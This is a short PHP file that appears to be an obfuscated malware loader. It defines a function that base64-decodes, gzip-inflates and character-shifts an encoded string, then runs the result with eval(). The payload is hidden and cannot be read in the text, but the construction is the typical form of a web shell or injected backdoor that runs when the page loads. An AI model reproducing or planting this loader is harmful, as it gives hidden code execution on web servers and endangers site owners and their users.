<?php function tsC($PcQ)
{ 
$PcQ=gzinflate(base64_decode($PcQ));
 for($i=0;$i<strlen($PcQ);$i++)
 {
$PcQ[$i] = chr(ord($PcQ[$i])-1);
 }
 return $PcQ;
 }eval(tsC("PY/BTsNADEQ/YL/Ch0pNIkHuRUKinCs4RFxXm43TuBhvtHYKEeq3s6WIOY7tN2OAItc2jYMGuokURmKET2KGHgEl5nU2HO7LvHWRgyp0+87vVf0hDcj+lYONKX/4l14xnzEDfhnKoPAWMqEU/4TR3Le7Rs1LzxRhXCQaJQESssJ6TjLSsdqkP0b9u3w7ueoQjrjbTcgz5mrbq7ac1sC2+jhhfMe8re8ek5RGC+NTQZ/J1qp++AdktCULbKy8eHMv7uJ+AA=="));?>